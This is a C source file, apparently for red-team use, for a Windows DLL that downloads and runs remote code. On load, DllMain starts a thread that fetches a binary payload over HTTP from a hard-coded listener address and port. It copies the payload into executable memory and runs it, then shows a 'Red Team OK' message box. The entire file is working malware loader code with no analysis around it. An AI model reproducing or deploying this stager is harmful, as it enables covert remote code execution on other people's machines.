// malicious.c
#define _WIN32_WINNT 0x0601   // <-- AÑADE ESTO (evita warnings raros)
#include <winsock2.h>         // <-- PRIMERO winsock2.h
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>            // <-- AÑADE ESTO (para snprintf)
#pragma comment(lib, "ws2_32.lib")

#define LHOST "172.16.41.1"
#define LPORT 8000
#define PAYLOAD_PATH "/PROUD_SHED.bin"
#define BUFFER_SIZE 4096

DWORD WINAPI DownloaderThread(LPVOID lpParam) {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server = {0};
    char request[512];
    char buffer[BUFFER_SIZE];
    unsigned char *data = NULL, *body = NULL;
    size_t size = 0, body_size = 0;
    int bytes;

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) goto cleanup;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) goto cleanup;

    server.sin_family = AF_INET;
    server.sin_port = htons(LPORT);
    inet_pton(AF_INET, LHOST, &server.sin_addr);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) goto cleanup;

    snprintf(request, sizeof(request), "GET %s HTTP/1.0\r\nHost: %s\r\n\r\n", PAYLOAD_PATH, LHOST);
    send(sock, request, strlen(request), 0);

    while ((bytes = recv(sock, buffer, BUFFER_SIZE, 0)) > 0) {
        unsigned char *tmp = realloc(data, size + bytes);
        if (!tmp) goto cleanup;
        data = tmp;
        memcpy(data + size, buffer, bytes);
        size += bytes;
    }

    char *sep = strstr((char*)data, "\r\n\r\n");
    if (sep) { body = (unsigned char*)(sep + 4); body_size = size - (body - data); }
    else { body = data; body_size = size; }

    if (body_size > 0) {
        LPVOID mem = VirtualAlloc(NULL, body_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem) {
            memcpy(mem, body, body_size);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
        }
    }

cleanup:
    if (data) free(data);
    if (sock != INVALID_SOCKET) closesocket(sock);
    WSACleanup();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, DownloaderThread, NULL, 0, NULL);
        MessageBoxA(NULL, "(DLL) Payload descargado y ejecutado", "Red Team OK", MB_OK);
    }
    return TRUE;
}